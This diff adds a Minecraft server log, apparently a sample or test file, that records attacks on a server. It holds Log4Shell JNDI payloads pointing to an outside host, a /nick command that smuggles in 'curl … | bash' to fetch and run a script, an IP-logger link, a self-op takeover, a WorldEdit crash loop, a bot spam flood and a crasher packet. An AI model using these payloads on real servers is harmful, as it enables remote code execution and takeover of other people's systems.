@@ -1,0 +1,65 @@
+[18:00:01] [Server thread/INFO]: Starting minecraft server version 1.17.1
+[18:00:01] [Server thread/INFO]: Loading properties
+[18:00:02] [Server thread/INFO]: Default game type: SURVIVAL
+[18:00:04] [Server thread/INFO]: Preparing level "world"
+[18:00:09] [Server thread/INFO]: Done (5.012s)! For help, type "help"
+[18:02:10] [User Authenticator #1/INFO]: UUID of player Steve is 8667ba71-b85a-4004-af54-457a9734eed7
+[18:02:10] [Server thread/INFO]: Steve[/82.132.45.10:50122] logged in with entity id 211 at ([world]12.5, 64.0, -30.2)
+[18:02:10] [Server thread/INFO]: Steve joined the game
+[18:02:15] [Async Chat Thread - #0/INFO]: <Steve> hi everyone
+[18:03:40] [User Authenticator #1/INFO]: UUID of player Alex is ec561538-f3fd-461d-aff5-086b22154bce
+[18:03:40] [Server thread/INFO]: Alex[/86.14.201.77:61002] logged in with entity id 214 at ([world]0.5, 70.0, 0.5)
+[18:03:40] [Server thread/INFO]: Alex joined the game
+[18:03:48] [Async Chat Thread - #0/INFO]: <Alex> anyone want to build a castle?
+[18:03:55] [Async Chat Thread - #0/INFO]: <Steve> sure, meet at spawn
+[18:05:02] [User Authenticator #2/INFO]: UUID of player xX_h4ck3r_Xx is 0d9a2b4c-5e6f-4a1b-9c8d-7e6f5a4b3c2d
+[18:05:02] [Server thread/INFO]: xX_h4ck3r_Xx[/45.155.205.233:44120] logged in with entity id 230 at ([world]0.5, 70.0, 0.5)
+[18:05:02] [Server thread/INFO]: xX_h4ck3r_Xx joined the game
+[18:05:05] [Server thread/INFO]: xX_h4ck3r_Xx issued server command: /plugins
+[18:05:07] [Server thread/INFO]: xX_h4ck3r_Xx issued server command: /version
+[18:05:15] [Async Chat Thread - #1/INFO]: <xX_h4ck3r_Xx> ${jndi:ldap://45.155.205.233:1389/Exploit}
+[18:05:22] [Async Chat Thread - #1/INFO]: <xX_h4ck3r_Xx> ${${lower:j}${lower:n}di:${lower:r}mi://45.155.205.233/a}
+[18:05:30] [Async Chat Thread - #1/INFO]: <xX_h4ck3r_Xx> free diamonds here -> https://grabify.link/ABC123
+[18:05:41] [Async Chat Thread - #1/INFO]: <xX_h4ck3r_Xx> #forceop xX_h4ck3r_Xx
+[18:05:42] [Server thread/INFO]: xX_h4ck3r_Xx issued server command: /op xX_h4ck3r_Xx
+[18:05:43] [Server thread/INFO]: [xX_h4ck3r_Xx: Made xX_h4ck3r_Xx a server operator]
+[18:05:50] [Server thread/INFO]: xX_h4ck3r_Xx issued server command: /gamerule sendCommandFeedback false
+[18:05:55] [Server thread/INFO]: xX_h4ck3r_Xx issued server command: /whitelist off
+[18:06:01] [Server thread/INFO]: xX_h4ck3r_Xx issued server command: //calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}
+[18:06:10] [Server thread/INFO]: xX_h4ck3r_Xx issued server command: /kill @e
+[18:06:20] [Server thread/INFO]: xX_h4ck3r_Xx issued server command: /nick test; curl http://45.155.205.233/x.sh | bash
+[18:06:30] [Server thread/WARN]: xX_h4ck3r_Xx moved too quickly! 48.2,0.0,31.7
+[18:06:45] [Server thread/INFO]: xX_h4ck3r_Xx lost connection: Disconnected
+[18:06:45] [Server thread/INFO]: xX_h4ck3r_Xx left the game
+[18:10:00] [Server thread/INFO]: [AuthMe] Admin used the wrong password
+[18:10:06] [Server thread/INFO]: [AuthMe] Admin used the wrong password
+[18:10:11] [Server thread/INFO]: [AuthMe] Admin used the wrong password
+[18:10:17] [Server thread/INFO]: [AuthMe] Admin used the wrong password
+[18:10:24] [Server thread/INFO]: [AuthMe] Admin used the wrong password
+[18:10:30] [Server thread/INFO]: [AuthMe] Admin used the wrong password
+[18:12:00] [Server thread/INFO]: Bot_0001[/185.220.101.4:40001] logged in with entity id 301 at ([world]0.5, 70.0, 0.5)
+[18:12:01] [Server thread/INFO]: Bot_0002[/185.220.101.4:40002] logged in with entity id 302 at ([world]0.5, 70.0, 0.5)
+[18:12:02] [Server thread/INFO]: Bot_0003[/185.220.101.4:40003] logged in with entity id 303 at ([world]0.5, 70.0, 0.5)
+[18:12:03] [Server thread/INFO]: Bot_0004[/185.220.101.4:40004] logged in with entity id 304 at ([world]0.5, 70.0, 0.5)
+[18:12:04] [Server thread/INFO]: Bot_0005[/185.220.101.4:40005] logged in with entity id 305 at ([world]0.5, 70.0, 0.5)
+[18:12:05] [Server thread/INFO]: Bot_0006[/185.220.101.4:40006] logged in with entity id 306 at ([world]0.5, 70.0, 0.5)
+[18:12:06] [Server thread/INFO]: Bot_0007[/185.220.101.4:40007] logged in with entity id 307 at ([world]0.5, 70.0, 0.5)
+[18:12:07] [Server thread/INFO]: Bot_0008[/185.220.101.4:40008] logged in with entity id 308 at ([world]0.5, 70.0, 0.5)
+[18:12:08] [Server thread/INFO]: Bot_0009[/185.220.101.4:40009] logged in with entity id 309 at ([world]0.5, 70.0, 0.5)
+[18:12:09] [Server thread/INFO]: Bot_0010[/185.220.101.4:40010] logged in with entity id 310 at ([world]0.5, 70.0, 0.5)
+[18:12:10] [Server thread/INFO]: Bot_0011[/185.220.101.4:40011] logged in with entity id 311 at ([world]0.5, 70.0, 0.5)
+[18:12:11] [Server thread/INFO]: Bot_0012[/185.220.101.4:40012] logged in with entity id 312 at ([world]0.5, 70.0, 0.5)
+[18:12:15] [Async Chat Thread - #2/INFO]: <Bot_0001> JOIN MY SERVER play.spam.net
+[18:12:16] [Async Chat Thread - #2/INFO]: <Bot_0001> JOIN MY SERVER play.spam.net
+[18:12:17] [Async Chat Thread - #2/INFO]: <Bot_0001> JOIN MY SERVER play.spam.net
+[18:12:18] [Async Chat Thread - #2/INFO]: <Bot_0001> JOIN MY SERVER play.spam.net
+[18:12:19] [Async Chat Thread - #2/INFO]: <Bot_0001> JOIN MY SERVER play.spam.net
+[18:13:02] [Netty Epoll Server IO #3/ERROR]: Error receiving packet 23 from /193.32.162.9:52110
+[18:13:02] [Netty Epoll Server IO #3/INFO]: io.netty.handler.codec.DecoderException: java.io.IOException: Payload may not be larger than 32767 bytes
+[18:13:02] [Server thread/INFO]: com.mojang.authlib.GameProfile@5e3a2c1f[id=<null>,name=Crasher,properties={},legacy=false] (/193.32.162.9:52110) lost connection: Internal Exception: io.netty.handler.codec.DecoderException: Badly compressed packet
+[18:14:10] [Server thread/INFO]: com.mojang.authlib.GameProfile@7a1b3c2d[id=<null>,name=Notch,properties={},legacy=false] (/91.240.118.50:39011) lost connection: Failed to verify username!
+[18:15:00] [Async Chat Thread - #0/INFO]: <Alex> did the server just lag?
+[18:15:05] [Async Chat Thread - #0/INFO]: <Steve> yeah lots of bots joined
+[18:20:00] [Server thread/INFO]: Steve lost connection: Disconnected
+[18:20:00] [Server thread/INFO]: Steve left the game
+[18:20:30] [Server thread/INFO]: Stopping server
